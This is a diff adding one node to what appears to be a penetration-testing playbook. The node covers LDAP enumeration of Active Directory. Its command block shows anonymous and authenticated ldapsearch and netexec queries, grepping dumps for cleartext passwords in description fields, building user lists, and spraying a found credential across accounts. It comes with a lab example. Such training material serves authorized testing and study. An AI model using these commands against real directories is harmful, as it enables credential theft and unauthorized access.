@@ -1,0 +1,30 @@
+{
+  "id": "ldap_enum",
+  "phase": "AD",
+  "title": "LDAP Enumeration \u2192 Users, Creds in Attributes",
+  "body": "Pull the directory over LDAP (389). Often anonymous-bind works with zero creds. The big win: user attributes - especially description - frequently hold CLEARTEXT passwords. Query by IP to dodge DNS, get the base DN right, and grep everything.",
+  "cmd": "# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# LDAP ENUM - the directory will often just hand you a password\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\n# -- STEP 1: Query by IP (skip DNS headaches) ----------------\n# Base DN = the domain split into dc= parts:  hutch.offsec -> dc=hutch,dc=offsec\n# Anonymous bind first (no creds needed on many DCs):\nldapsearch -x -H ldap://$ip -b \"dc=DOMAIN,dc=TLD\" \"(objectClass=person)\"\n# Connection refused / 'Can't contact LDAP server (-1)' = usually a NAME\n# problem (wrong host / extra .com) - use the IP, not the hostname.\n\n# -- STEP 2: If anon bind is blocked, authenticate -----------\n# (You're assumed-breach - use the cred you have.)\n# NOTE: simple bind (-x) wants UPN (user@dom.tld) or full DN, not DOMAIN\\\\user.\nldapsearch -x -H ldap://$ip -D \"user@DOMAIN.TLD\" -w 'pass' -b \"dc=DOMAIN,dc=TLD\" \"(objectClass=person)\"\n# netexec is faster for structured pulls:\nnxc ldap $ip -u user -p 'pass' --users\nnxc ldap $ip -u '' -p '' --users        # try null/anon too\n\n# -- STEP 3: GREP FOR CLEARTEXT CREDS (the actual win) -------\n# Dump everything to a file, then mine it:\nldapsearch -x -H ldap://$ip -b \"dc=DOMAIN,dc=TLD\" > ldap_all.txt\ngrep -i -E 'description|info|comment|password|pwd' ldap_all.txt\n# Admins stash creds in 'description' constantly. Worked example (Hutch):\n#   description: Password set to CrabSharkJellyfish192 at user's request.\n# That one line was the entire foothold.\n\n# -- STEP 4: Build a users list (for spray / roast) ----------\nldapsearch -x -H ldap://$ip -b \"dc=DOMAIN,dc=TLD\" \"(objectClass=person)\" sAMAccountName | awk '/^sAMAccountName:/{print $2}' > users.txt\nwc -l users.txt\n\n# -- STEP 5: Decode userAccountControl flags -----------------\n# In the dump, UAC tells you account state:\n#   512   = normal enabled account\n#   514   = DISABLED\n#   66048 = enabled + PASSWORD_NEVER_EXPIRES  (a found pw is likely STILL valid)\n#   66082 = disabled + pw-never-expires (e.g. Guest)\n#   4260352 = no-preauth set -> AS-REP roastable\n\n# -- STEP 6: VERIFY any found credential ---------------------\nnxc smb $ip -u FOUND_USER -p 'FOUND_PASS'\n# [+] = live cred. Then SPRAY it across users.txt and move into AD attacks.\nnxc smb $ip -u users.txt -p 'FOUND_PASS' --continue-on-success\n",
+  "warn": "Query by IP, not hostname - 'Can't contact LDAP server (-1)' is almost always a name/DNS issue (a stale /etc/hosts or an extra .com), not LDAP itself. Base DN is the domain as dc= parts (hutch.offsec = dc=hutch,dc=offsec), NOT the dc=example,dc=com placeholder. Always grep the dump for 'description'/'info' - cleartext passwords live there. UAC 66048 = password-never-expires, so a found cred is probably still valid despite any 'change on next login' note.",
+  "choices": [
+    {
+      "label": "Found a cleartext cred \u2192 where does it work?",
+      "next": "creds_found"
+    },
+    {
+      "label": "Have a valid cred \u2192 Kerberoast",
+      "next": "kerberoast"
+    },
+    {
+      "label": "No-preauth users (UAC) \u2192 AS-REP roast",
+      "next": "asrep_roast"
+    },
+    {
+      "label": "Got users + a cred \u2192 run BloodHound",
+      "next": "bloodhound"
+    },
+    {
+      "label": "Back to AD assumed-breach",
+      "next": "ad_start"
+    }
+  ]
+}
